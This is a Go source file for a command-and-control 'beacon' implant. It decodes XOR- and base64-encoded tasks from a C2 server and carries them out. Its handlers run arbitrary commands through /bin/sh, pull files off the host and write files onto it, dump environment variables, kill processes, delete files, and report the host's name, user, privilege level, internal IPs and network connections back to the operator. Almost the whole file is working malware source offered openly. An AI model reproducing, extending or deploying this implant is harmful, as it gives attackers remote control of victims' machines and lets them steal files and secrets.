package beacon

import (
	"bufio"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"math"
	"math/rand"
	"net"
	"os"
	"os/exec"
	osuser "os/user"
	"path/filepath"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
)

const (
	instructionLS       = "ls"
	instructionPS       = "ps"
	instructionCD       = "cd"
	instructionPWD      = "pwd"
	instructionCAT      = "cat"
	instructionDownload = "download"
	instructionUpload   = "upload"
	instructionRun      = "run"
	instructionShell    = "shell"
	instructionSleep    = "SL"
	instructionEnd      = "EN"

	fileTypeFile      = "f"
	fileTypeDirectory = "d"

	defaultListDirectory = "."
	defaultEmptyResponse = "Empty response."
	defaultDownloadOK    = "File downloaded"
	defaultDownloadKO    = "Download failed"
	defaultUploadOK      = "File uploaded."
	defaultUploadKO      = "Upload failed."
	defaultUnknownCmd    = "cmd unknown."
	defaultNoFile        = "No file specified."
	defaultNoPath        = "No path specified."
	defaultNoDir         = "No directory specified."
	defaultRemoveOK      = "Removed: %s"
	defaultRemoveFail    = "Failed to remove %s: %v"
	defaultMkdirOK       = "Directory created: %s"
	defaultMkdirFail     = "Failed to create directory: %v"
	defaultRunFail       = "Failed to execute command: %v"
	defaultChangeDirFail = "Failed to change directory: %v"
	defaultKillFail      = "Failed to terminate process %d: %v"
	defaultKillOK        = "Process %d terminated."
	defaultInvalidPID    = "Invalid PID: %s"
	defaultTreeMissing   = "No such file or directory: %s"
	defaultCatMissing    = "No such file or directory: %s"
	defaultEnvMessage    = "Share enumeration is not supported on this implant."

	usernameDefault = "user"
	usernameRoot    = "root"

	privilegeRoot = "high"
	privilegeUser = "low"

	sleepMilliseconds = 1000

	bundleKeyBeaconHash   = "BH"
	bundleKeyListenerHash = "LH"
	bundleKeyUsername     = "UN"
	bundleKeyHostname     = "HN"
	bundleKeyArch         = "ARC"
	bundleKeyPrivilege    = "PR"
	bundleKeyOS           = "OS"
	bundleKeyPOF          = "POF"
	bundleKeyInternalIPs  = "IIPS"
	bundleKeyProcessID    = "PID"
	bundleKeyAdditional   = "ADI"
	bundleKeySessions     = "SS"

	msgKeyInstruction = "INS"
	msgKeyCommand     = "CM"
	msgKeyArgs        = "AR"
	msgKeyData        = "DA"
	msgKeyInputFile   = "IF"
	msgKeyOutputFile  = "OF"
	msgKeyPID         = "PI"
	msgKeyErrorCode   = "EC"
	msgKeyUUID        = "UID"
	msgKeyReturnValue = "RV"
)

const characterPool = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"

// Task represents a single command to be executed by the implant.
type Task struct {
	Instruction string
	Cmd         string
	Args        string
	Data        []byte
	InputFile   string
	OutputFile  string
	PID         int
	ErrorCode   int
	UUID        string
	ReturnValue string
}

// TaskResult represents the output of a processed task.
type TaskResult struct {
	Instruction string
	Cmd         string
	Args        string
	Data        []byte
	InputFile   string
	OutputFile  string
	PID         int
	ErrorCode   int
	UUID        string
	ReturnValue string
}

type handlerFunc func(cmd, args string, data []byte, inputFile, outputFile string, pid int) (string, []byte)

// Beacon models the core implant behaviour and state.
type Beacon struct {
	beaconHash   string
	listenerHash string
	hostname     string
	username     string
	arch         string
	privilege    string
	os           string
	internalIPs  string
	processID    string
	additional   string
	xorKey       string
	SleepTimeMS  int

	tasks       []Task
	taskResults []TaskResult

	handlers map[string]handlerFunc
	mu       sync.Mutex
}

// NewBeacon constructs a new Beacon with host information populated.
func NewBeacon() *Beacon {
	b := &Beacon{
		SleepTimeMS: sleepMilliseconds,
		handlers:    make(map[string]handlerFunc),
	}

	rand.Seed(time.Now().UnixNano())
	b.beaconHash = randomString(32)
	b.hostname, _ = os.Hostname()
	if b.hostname == "" {
		b.hostname = "unknown"
	}
	b.username = currentUsername()
	if b.username == "" {
		b.username = usernameDefault
	}
	b.arch = runtime.GOARCH
	if strings.EqualFold(b.username, usernameRoot) {
		b.privilege = privilegeRoot
	} else {
		b.privilege = privilegeUser
	}
	b.os = runtime.GOOS
	b.internalIPs = collectInternalIPs()
	b.processID = strconv.Itoa(os.Getpid())
	b.registerInstructionHandlers()

	return b
}

// SetXORKey configures the XOR key used when encrypting/decrypting beacon traffic.
func (b *Beacon) SetXORKey(key string) {
	b.mu.Lock()
	defer b.mu.Unlock()
	b.xorKey = key
}

// SetBeaconHash overrides the randomly generated beacon identifier.
func (b *Beacon) SetBeaconHash(hash string) {
	b.mu.Lock()
	defer b.mu.Unlock()
	b.beaconHash = hash
}

// BeaconHash returns the current beacon identifier.
func (b *Beacon) BeaconHash() string {
	b.mu.Lock()
	defer b.mu.Unlock()
	return b.beaconHash
}

func (b *Beacon) registerInstructionHandlers() {
	b.handlers = map[string]handlerFunc{
		"lm":                    b.handleLoadModule,
		"change_directory":      b.handleChangeDirectory,
		"changedirectory":       b.handleChangeDirectory,
		instructionCD:           b.handleChangeDirectory,
		instructionDownload:     b.handleDownload,
		instructionUpload:       b.handleUpload,
		"listdirectory":         b.handleListDirectory,
		instructionLS:           b.handleListDirectory,
		"dir":                   b.handleListDirectory,
		"listprocesses":         b.handleListProcesses,
		instructionPS:           b.handleListProcesses,
		"powershell":            b.handlePowershell,
		"printworkingdirectory": b.handlePWD,
		instructionPWD:          b.handlePWD,
		instructionRun:          b.handleRun,
		instructionShell:        b.handleShell,
		instructionCAT:          b.handleCat,
		"mkdir":                 b.handleMkdir,
		"remove":                b.handleRemove,
		"rm":                    b.handleRemove,
		"killprocess":           b.handleKillProcess,
		"tree":                  b.handleTree,
		"getenv":                b.handleGetenv,
		"whoami":                b.handleWhoami,
		"netstat":               b.handleNetstat,
		"ipconfig":              b.handleIPConfig,
		"enumerateshares":       b.handleEnumerateShares,
	}
}

// Tasks returns a copy of the queued tasks for inspection.
func (b *Beacon) Tasks() []Task {
	b.mu.Lock()
	defer b.mu.Unlock()
	cp := make([]Task, len(b.tasks))
	copy(cp, b.tasks)
	return cp
}

// EnqueueTask appends a task to the internal queue.
func (b *Beacon) EnqueueTask(task Task) {
	b.mu.Lock()
	defer b.mu.Unlock()
	b.tasks = append(b.tasks, task)
}

// TaskResults returns a copy of the task results.
func (b *Beacon) TaskResults() []TaskResult {
	b.mu.Lock()
	defer b.mu.Unlock()
	cp := make([]TaskResult, len(b.taskResults))
	copy(cp, b.taskResults)
	return cp
}

// InstructionHandlers exposes a copy of the registered instruction handlers.
func (b *Beacon) InstructionHandlers() map[string]handlerFunc {
	b.mu.Lock()
	defer b.mu.Unlock()
	handlers := make(map[string]handlerFunc, len(b.handlers))
	for key, handler := range b.handlers {
		handlers[key] = handler
	}
	return handlers
}

func (b *Beacon) xorKeyValue() string {
	if b.xorKey == "" {
		return ""
	}
	return b.xorKey
}

// SerializeTaskResults converts task results into the C2 payload format.
func (b *Beacon) SerializeTaskResults() string {
	b.mu.Lock()
	defer b.mu.Unlock()

	bundle := make(map[string]any)
	if b.beaconHash != "" {
		bundle[bundleKeyBeaconHash] = b.beaconHash
	}
	if b.listenerHash != "" {
		bundle[bundleKeyListenerHash] = b.listenerHash
	}
	if b.username != "" {
		bundle[bundleKeyUsername] = b.username
	}
	if b.hostname != "" {
		bundle[bundleKeyHostname] = b.hostname
	}
	if b.arch != "" {
		bundle[bundleKeyArch] = b.arch
	}
	if b.privilege != "" {
		bundle[bundleKeyPrivilege] = b.privilege
	}
	if b.os != "" {
		bundle[bundleKeyOS] = b.os
	}
	bundle[bundleKeyPOF] = "0"
	if b.internalIPs != "" {
		bundle[bundleKeyInternalIPs] = b.internalIPs
	}
	if b.processID != "" {
		bundle[bundleKeyProcessID] = b.processID
	}
	if b.additional != "" {
		bundle[bundleKeyAdditional] = b.additional
	}

	if len(b.taskResults) > 0 {
		sessions := make([]map[string]any, 0, len(b.taskResults))
		for _, result := range b.taskResults {
			sessions = append(sessions, encodeC2Message(result))
		}
		bundle[bundleKeySessions] = sessions
	}

	payload, _ := json.Marshal([]any{bundle})
	encrypted := xorBytes(payload, b.xorKeyValue())
	encoded := base64.StdEncoding.EncodeToString(encrypted)

	b.taskResults = nil
	return encoded
}

// CmdToTasks decodes a C2 payload into queued tasks.
func (b *Beacon) CmdToTasks(payload string) {
	payload = strings.TrimSpace(payload)
	if payload == "" {
		return
	}

	decoded, err := base64.StdEncoding.DecodeString(payload)
	if err != nil {
		return
	}

	decrypted := xorBytes(decoded, b.xorKeyValue())

	var bundles []map[string]any
	if err := json.Unmarshal(decrypted, &bundles); err != nil {
		return
	}

	b.mu.Lock()
	defer b.mu.Unlock()

	for _, bundle := range bundles {
		if bundle == nil {
			continue
		}
		beaconHash, _ := bundle[bundleKeyBeaconHash].(string)
		if beaconHash != "" && beaconHash != b.beaconHash {
			continue
		}
		sessions, _ := bundle[bundleKeySessions].([]any)
		for _, sess := range sessions {
			sessionMap, ok := sess.(map[string]any)
			if !ok {
				continue
			}
			task := decodeC2Message(sessionMap)
			if task.Instruction != "" {
				b.tasks = append(b.tasks, task)
			}
		}
	}
}

// ExecInstruction executes queued tasks using registered handlers.
func (b *Beacon) ExecInstruction() {
	b.mu.Lock()
	tasks := make([]Task, len(b.tasks))
	copy(tasks, b.tasks)
	b.tasks = nil
	b.mu.Unlock()

	results := make([]TaskResult, 0, len(tasks))

	for _, task := range tasks {
		instLower := strings.ToLower(task.Instruction)
		handler := b.handlers[instLower]
		resultStr := ""
		data := task.Data

		switch task.Instruction {
		case instructionSleep:
			resultStr = task.Cmd
			if cmd := strings.TrimSpace(task.Cmd); cmd != "" {
				if val, err := strconv.ParseFloat(cmd, 64); err == nil {
					b.mu.Lock()
					b.SleepTimeMS = int(math.Round(val * sleepMilliseconds))
					b.mu.Unlock()
				}
			}
		case instructionEnd:
			os.Exit(0)
		default:
			if handler != nil {
				rv, outData := handler(task.Cmd, task.Args, task.Data, task.InputFile, task.OutputFile, task.PID)
				resultStr = rv
				data = outData
			} else {
				resultStr = defaultUnknownCmd
				data = nil
			}
		}

		results = append(results, TaskResult{
			Instruction: task.Instruction,
			Cmd:         task.Cmd,
			Args:        task.Args,
			Data:        data,
			InputFile:   task.InputFile,
			OutputFile:  task.OutputFile,
			PID:         task.PID,
			ErrorCode:   task.ErrorCode,
			UUID:        task.UUID,
			ReturnValue: resultStr,
		})
	}

	b.mu.Lock()
	b.taskResults = append(b.taskResults, results...)
	b.mu.Unlock()
}

// Handler implementations ----------------------------------------------------

func (b *Beacon) handleLoadModule(cmd, args string, data []byte, inputFile, outputFile string, pid int) (string, []byte) {
	return "LoadModule is not required.", nil
}

func (b *Beacon) handleChangeDirectory(cmd, args string, data []byte, inputFile, outputFile string, pid int) (string, []byte) {
	target := firstNonEmpty(cmd, args, inputFile, defaultListDirectory)
	if err := os.Chdir(target); err != nil {
		return fmt.Sprintf(defaultChangeDirFail, err), nil
	}
	cwd, err := os.Getwd()
	if err != nil {
		return fmt.Sprintf(defaultChangeDirFail, err), nil
	}
	return cwd, nil
}

func (b *Beacon) handleDownload(cmd, args string, data []byte, inputFile, outputFile string, pid int) (string, []byte) {
	path := firstNonEmpty(inputFile, cmd, args)
	if path == "" {
		return defaultDownloadKO, nil
	}
	fileData, err := os.ReadFile(path)
	if err != nil {
		return defaultDownloadKO, nil
	}
	return defaultDownloadOK, fileData
}

func (b *Beacon) handleUpload(cmd, args string, data []byte, inputFile, outputFile string, pid int) (string, []byte) {
	path := firstNonEmpty(outputFile, cmd, args)
	if path == "" {
		return defaultUploadKO, data
	}
	if err := os.WriteFile(path, data, 0o600); err != nil {
		return defaultUploadKO, data
	}
	return defaultUploadOK, nil
}

func (b *Beacon) handleListDirectory(cmd, args string, data []byte, inputFile, outputFile string, pid int) (string, []byte) {
	directory := firstNonEmpty(cmd, args, inputFile, defaultListDirectory)
	entries, err := os.ReadDir(directory)
	if err != nil {
		return fmt.Sprintf(defaultTreeMissing, directory), nil
	}

	var lines []string
	for _, entry := range entries {
		info, err := entry.Info()
		if err != nil {
			continue
		}
		mode := info.Mode()
		var fType string
		switch {
		case mode.IsDir():
			fType = fileTypeDirectory
		default:
			fType = fileTypeFile
		}
		size := info.Size()
		perm := mode.Perm().String()
		lines = append(lines, fmt.Sprintf("%s %s %12d %s", fType, perm[len(perm)-3:], size, entry.Name()))
	}
	sort.Strings(lines)
	return strings.Join(lines, "\n"), nil
}

func (b *Beacon) handleListProcesses(cmd, args string, data []byte, inputFile, outputFile string, pid int) (string, []byte) {
	result, err := listProcesses()
	if err != nil {
		return defaultEmptyResponse, nil
	}
	if result == "" {
		return defaultEmptyResponse, nil
	}
	return result, nil
}

func (b *Beacon) handlePowershell(cmd, args string, data []byte, inputFile, outputFile string, pid int) (string, []byte) {
	return "PowerShell execution is not supported on this implant.", nil
}

func (b *Beacon) handlePWD(cmd, args string, data []byte, inputFile, outputFile string, pid int) (string, []byte) {
	cwd, err := os.Getwd()
	if err != nil {
		return fmt.Sprintf(defaultChangeDirFail, err), nil
	}
	return cwd, nil
}

func (b *Beacon) handleRun(cmd, args string, data []byte, inputFile, outputFile string, pid int) (string, []byte) {
	command := firstNonEmpty(cmd, args)
	if command == "" {
		return defaultEmptyResponse, nil
	}
	out, err := exec.Command("/bin/sh", "-c", command).CombinedOutput()
	if err != nil {
		return fmt.Sprintf(defaultRunFail, err), nil
	}
	text := strings.TrimSpace(string(out))
	if text == "" {
		text = defaultEmptyResponse
	}
	return text, nil
}

func (b *Beacon) handleShell(cmd, args string, data []byte, inputFile, outputFile string, pid int) (string, []byte) {
	return b.handleRun(cmd, args, data, inputFile, outputFile, pid)
}

func (b *Beacon) handleCat(cmd, args string, data []byte, inputFile, outputFile string, pid int) (string, []byte) {
	path := firstNonEmpty(inputFile, cmd, args)
	if path == "" {
		return defaultNoFile, nil
	}
	contents, err := os.ReadFile(path)
	if err != nil {
		return fmt.Sprintf(defaultCatMissing, path), nil
	}
	return string(contents), nil
}

func (b *Beacon) handleMkdir(cmd, args string, data []byte, inputFile, outputFile string, pid int) (string, []byte) {
	directory := firstNonEmpty(cmd, args, inputFile)
	if directory == "" {
		return defaultNoDir, nil
	}
	if err := os.MkdirAll(directory, 0o755); err != nil {
		return fmt.Sprintf(defaultMkdirFail, err), nil
	}
	return fmt.Sprintf(defaultMkdirOK, directory), nil
}

func (b *Beacon) handleRemove(cmd, args string, data []byte, inputFile, outputFile string, pid int) (string, []byte) {
	target := firstNonEmpty(cmd, args, inputFile)
	if target == "" {
		return defaultNoPath, nil
	}
	info, err := os.Lstat(target)
	if err != nil {
		return fmt.Sprintf(defaultCatMissing, target), nil
	}
	if info.IsDir() && info.Mode()&os.ModeSymlink == 0 {
		if err := os.RemoveAll(target); err != nil {
			return fmt.Sprintf(defaultRemoveFail, target, err), nil
		}
	} else {
		if err := os.Remove(target); err != nil {
			return fmt.Sprintf(defaultRemoveFail, target, err), nil
		}
	}
	return fmt.Sprintf(defaultRemoveOK, target), nil
}

func (b *Beacon) handleKillProcess(cmd, args string, data []byte, inputFile, outputFile string, pidValue int) (string, []byte) {
	pidStr := firstNonEmpty(cmd, args)
	if pidStr == "" && pidValue > 0 {
		pidStr = strconv.Itoa(pidValue)
	}
	processID, err := strconv.Atoi(strings.TrimSpace(pidStr))
	if err != nil {
		return fmt.Sprintf(defaultInvalidPID, pidStr), nil
	}
	if err := syscall.Kill(processID, syscall.SIGKILL); err != nil {
		return fmt.Sprintf(defaultKillFail, processID, err), nil
	}
	return fmt.Sprintf(defaultKillOK, processID), nil
}

func (b *Beacon) handleTree(cmd, args string, data []byte, inputFile, outputFile string, pid int) (string, []byte) {
	basePath := firstNonEmpty(cmd, args, inputFile, defaultListDirectory)
	info, err := os.Stat(basePath)
	if err != nil || !info.IsDir() {
		return fmt.Sprintf(defaultTreeMissing, basePath), nil
	}
	basePath, _ = filepath.Abs(basePath)
	var lines []string
	filepath.WalkDir(basePath, func(path string, d os.DirEntry, err error) error {
		if err != nil {
			return nil
		}
		rel, _ := filepath.Rel(basePath, path)
		level := 0
		if rel != "." {
			level = strings.Count(rel, string(filepath.Separator)) + 1
		}
		indent := strings.Repeat("    ", level)
		name := filepath.Base(path)
		if path == basePath {
			name = filepath.Base(basePath)
		}
		if d.IsDir() {
			lines = append(lines, fmt.Sprintf("%s%s/", indent, name))
		} else {
			lines = append(lines, fmt.Sprintf("%s%s", indent+"    ", name))
		}
		return nil
	})
	return strings.Join(lines, "\n"), nil
}

func (b *Beacon) handleGetenv(cmd, args string, data []byte, inputFile, outputFile string, pid int) (string, []byte) {
	key := firstNonEmpty(cmd, args, inputFile)
	if key != "" {
		return os.Getenv(key), nil
	}
	envs := os.Environ()
	sort.Strings(envs)
	return strings.Join(envs, "\n"), nil
}

func (b *Beacon) handleWhoami(cmd, args string, data []byte, inputFile, outputFile string, pid int) (string, []byte) {
	user := currentUsername()
	if user == "" {
		user = b.username
	}
	if user == "" {
		user = usernameDefault
	}
	return user, nil
}

func (b *Beacon) handleNetstat(cmd, args string, data []byte, inputFile, outputFile string, pid int) (string, []byte) {
	report, err := netstat()
	if err != nil {
		return fmt.Sprintf("Failed to collect network information: %v", err), nil
	}
	if report == "" {
		return defaultEmptyResponse, nil
	}
	return report, nil
}

func (b *Beacon) handleIPConfig(cmd, args string, data []byte, inputFile, outputFile string, pid int) (string, []byte) {
	report, err := ipconfig()
	if err != nil {
		return fmt.Sprintf("Failed to collect interface information: %v", err), nil
	}
	if report == "" {
		return defaultEmptyResponse, nil
	}
	return report, nil
}

func (b *Beacon) handleEnumerateShares(cmd, args string, data []byte, inputFile, outputFile string, pid int) (string, []byte) {
	return defaultEnvMessage, nil
}

// Helper utilities -----------------------------------------------------------

func randomString(length int) string {
	buf := make([]byte, length)
	for i := 0; i < length; i++ {
		buf[i] = characterPool[rand.Intn(len(characterPool))]
	}
	return string(buf)
}

func currentUsername() string {
	if u := os.Getenv("USER"); u != "" {
		return u
	}
	if u := os.Getenv("USERNAME"); u != "" {
		return u
	}
	if runtime.GOOS != "windows" {
		if u, err := userLookup(); err == nil {
			return u
		}
	}
	return ""
}

func userLookup() (string, error) {
	out, err := exec.Command("/usr/bin/id", "-un").Output()
	if err != nil {
		return "", err
	}
	return strings.TrimSpace(string(out)), nil
}

func collectInternalIPs() string {
	ifaces, err := net.Interfaces()
	if err != nil {
		return ""
	}
	var ips []string
	for _, iface := range ifaces {
		if iface.Flags&net.FlagUp == 0 {
			continue
		}
		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}
		for _, addr := range addrs {
			var ip net.IP
			switch v := addr.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip = v.IP
			}
			if ip == nil || ip.IsLoopback() {
				continue
			}
			ipv4 := ip.To4()
			if ipv4 != nil {
				ips = append(ips, ipv4.String())
			} else if ip.To16() != nil {
				ips = append(ips, ip.String())
			}
		}
	}
	return strings.Join(removeDuplicates(ips), "\n")
}

func removeDuplicates(values []string) []string {
	seen := make(map[string]struct{})
	var result []string
	for _, v := range values {
		if _, ok := seen[v]; ok {
			continue
		}
		seen[v] = struct{}{}
		result = append(result, v)
	}
	return result
}

func xorBytes(data []byte, key string) []byte {
	if key == "" {
		return append([]byte(nil), data...)
	}
	keyBytes := []byte(key)
	buf := make([]byte, len(data))
	for i, b := range data {
		buf[i] = b ^ keyBytes[i%len(keyBytes)]
	}
	return buf
}

func encodeC2Message(result TaskResult) map[string]any {
	encoded := make(map[string]any)
	if result.Instruction != "" {
		encoded[msgKeyInstruction] = result.Instruction
	}
	if result.Cmd != "" {
		encoded[msgKeyCommand] = result.Cmd
	}
	if result.ReturnValue != "" {
		encoded[msgKeyReturnValue] = base64.StdEncoding.EncodeToString([]byte(result.ReturnValue))
	}
	if result.InputFile != "" {
		encoded[msgKeyInputFile] = base64.StdEncoding.EncodeToString([]byte(result.InputFile))
	}
	if result.OutputFile != "" {
		encoded[msgKeyOutputFile] = base64.StdEncoding.EncodeToString([]byte(result.OutputFile))
	}
	if len(result.Data) > 0 {
		encoded[msgKeyData] = base64.StdEncoding.EncodeToString(result.Data)
	}
	if result.Args != "" {
		encoded[msgKeyArgs] = result.Args
	}
	if result.PID > 0 {
		encoded[msgKeyPID] = result.PID
	}
	if result.ErrorCode > -1 {
		encoded[msgKeyErrorCode] = result.ErrorCode
	}
	if result.UUID != "" {
		encoded[msgKeyUUID] = result.UUID
	}
	return encoded
}

func decodeC2Message(message map[string]any) Task {
	task := Task{PID: -1, ErrorCode: -1}
	if v, ok := message[msgKeyInstruction]; ok {
		task.Instruction = fmt.Sprint(v)
	}
	if v, ok := message[msgKeyCommand]; ok {
		task.Cmd = fmt.Sprint(v)
	}
	if v, ok := message[msgKeyArgs]; ok {
		task.Args = fmt.Sprint(v)
	}
	if v, ok := message[msgKeyUUID]; ok {
		task.UUID = fmt.Sprint(v)
	}
	if v, ok := message[msgKeyPID]; ok {
		if pid, err := toInt(v); err == nil {
			task.PID = pid
		}
	}
	if v, ok := message[msgKeyErrorCode]; ok {
		if code, err := toInt(v); err == nil {
			task.ErrorCode = code
		}
	}
	if v, ok := message[msgKeyInputFile].(string); ok && v != "" {
		if decoded, err := base64.StdEncoding.DecodeString(v); err == nil {
			task.InputFile = string(decoded)
		}
	}
	if v, ok := message[msgKeyOutputFile].(string); ok && v != "" {
		if decoded, err := base64.StdEncoding.DecodeString(v); err == nil {
			task.OutputFile = string(decoded)
		}
	}
	if v, ok := message[msgKeyReturnValue].(string); ok && v != "" {
		if decoded, err := base64.StdEncoding.DecodeString(v); err == nil {
			task.ReturnValue = string(decoded)
		}
	}
	if v, ok := message[msgKeyData].(string); ok && v != "" {
		if decoded, err := base64.StdEncoding.DecodeString(v); err == nil {
			task.Data = decoded
		}
	}
	return task
}

func toInt(value any) (int, error) {
	switch v := value.(type) {
	case float64:
		return int(v), nil
	case int:
		return v, nil
	case json.Number:
		i64, err := v.Int64()
		if err != nil {
			return 0, err
		}
		return int(i64), nil
	case string:
		return strconv.Atoi(v)
	default:
		return 0, errors.New("unsupported type")
	}
}

func firstNonEmpty(values ...string) string {
	for _, v := range values {
		if strings.TrimSpace(v) != "" {
			return v
		}
	}
	return ""
}

func listProcesses() (string, error) {
	procEntries, err := os.ReadDir("/proc")
	if err != nil {
		return "", err
	}
	type procInfo struct {
		pid   int
		user  string
		cmd   string
		state string
	}
	var infos []procInfo
	for _, entry := range procEntries {
		if !entry.IsDir() {
			continue
		}
		pid, err := strconv.Atoi(entry.Name())
		if err != nil {
			continue
		}
		statusPath := filepath.Join("/proc", entry.Name(), "status")
		statusFile, err := os.Open(statusPath)
		if err != nil {
			continue
		}
		var state, uid string
		scanner := bufio.NewScanner(statusFile)
		for scanner.Scan() {
			line := scanner.Text()
			if strings.HasPrefix(line, "State:") {
				state = strings.TrimSpace(strings.TrimPrefix(line, "State:"))
			}
			if strings.HasPrefix(line, "Uid:") {
				fields := strings.Fields(strings.TrimSpace(strings.TrimPrefix(line, "Uid:")))
				if len(fields) > 0 {
					uid = fields[0]
				}
			}
		}
		statusFile.Close()
		if err := scanner.Err(); err != nil {
			continue
		}
		user := uid
		if uid != "" {
			if u, err := osuser.LookupId(uid); err == nil {
				user = u.Username
			}
		}
		if user == "" {
			user = "unknown"
		}
		cmdline, err := os.ReadFile(filepath.Join("/proc", entry.Name(), "cmdline"))
		cmd := ""
		if err == nil {
			cmd = strings.ReplaceAll(string(cmdline), "\x00", " ")
			cmd = strings.TrimSpace(cmd)
		}
		if cmd == "" {
			data, err := os.ReadFile(filepath.Join("/proc", entry.Name(), "comm"))
			if err == nil {
				cmd = strings.TrimSpace(string(data))
			}
		}
		if cmd == "" {
			cmd = "unknown"
		}
		infos = append(infos, procInfo{pid: pid, user: user, cmd: cmd, state: state})
	}
	sort.Slice(infos, func(i, j int) bool { return infos[i].pid < infos[j].pid })
	var buf strings.Builder
	buf.WriteString("PID\tUSER\tSTATE\tCMD")
	for _, info := range infos {
		buf.WriteString("\n")
		buf.WriteString(fmt.Sprintf("%d\t%s\t%s\t%s", info.pid, info.user, info.state, info.cmd))
	}
	return buf.String(), nil
}

func netstat() (string, error) {
	procFiles := []struct {
		path  string
		proto string
	}{
		{"/proc/net/tcp", "tcp"},
		{"/proc/net/tcp6", "tcp6"},
		{"/proc/net/udp", "udp"},
		{"/proc/net/udp6", "udp6"},
	}

	var lines []string
	lines = append(lines, "Proto Local Address                  Foreign Address                State")
	for _, file := range procFiles {
		content, err := os.ReadFile(file.path)
		if err != nil {
			continue
		}
		rows := strings.Split(strings.TrimSpace(string(content)), "\n")
		if len(rows) <= 1 {
			continue
		}
		for _, row := range rows[1:] {
			fields := strings.Fields(row)
			if len(fields) < 4 {
				continue
			}
			local := parseAddress(fields[1])
			remote := parseAddress(fields[2])
			state := fields[3]
			if len(state) == 2 {
				if human, ok := tcpStates[state]; ok {
					state = human
				}
			}
			lines = append(lines, fmt.Sprintf("%s %-29s %-29s %s", file.proto, local, remote, state))
		}
	}
	if len(lines) == 1 {
		return "", nil
	}
	return strings.Join(lines, "\n"), nil
}

var tcpStates = map[string]string{
	"01": "ESTABLISHED",
	"02": "SYN_SENT",
	"03": "SYN_RECV",
	"04": "FIN_WAIT1",
	"05": "FIN_WAIT2",
	"06": "TIME_WAIT",
	"07": "CLOSE",
	"08": "CLOSE_WAIT",
	"09": "LAST_ACK",
	"0A": "LISTEN",
	"0B": "CLOSING",
}

func parseAddress(hexAddress string) string {
	parts := strings.Split(hexAddress, ":")
	if len(parts) != 2 {
		return hexAddress
	}
	portHex := parts[1]
	portVal, _ := strconv.ParseUint(portHex, 16, 16)
	addrHex := parts[0]
	if len(addrHex) == 8 { // IPv4 little endian
		bytesVal := make([]byte, 4)
		for i := 0; i < 4; i++ {
			segment, _ := strconv.ParseUint(addrHex[2*i:2*i+2], 16, 8)
			bytesVal[3-i] = byte(segment)
		}
		return fmt.Sprintf("%s:%d", net.IP(bytesVal).String(), portVal)
	}
	if len(addrHex) == 32 { // IPv6 little endian
		ip := make([]byte, 16)
		for i := 0; i < 16; i++ {
			ip[15-i] = byte(mustParseHex(addrHex[2*i : 2*i+2]))
		}
		return fmt.Sprintf("%s:%d", net.IP(ip).String(), portVal)
	}
	return hexAddress
}

func mustParseHex(value string) uint64 {
	v, _ := strconv.ParseUint(value, 16, 8)
	return v
}

func ipconfig() (string, error) {
	ifaces, err := net.Interfaces()
	if err != nil {
		return "", err
	}
	var buf strings.Builder
	for _, iface := range ifaces {
		buf.WriteString(fmt.Sprintf("%s:\n", iface.Name))
		if len(iface.HardwareAddr) > 0 {
			buf.WriteString(fmt.Sprintf("  mac: %s\n", iface.HardwareAddr))
		}
		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}
		for _, addr := range addrs {
			buf.WriteString(fmt.Sprintf("  addr: %s\n", addr.String()))
		}
		buf.WriteString("\n")
	}
	return strings.TrimSpace(buf.String()), nil
}
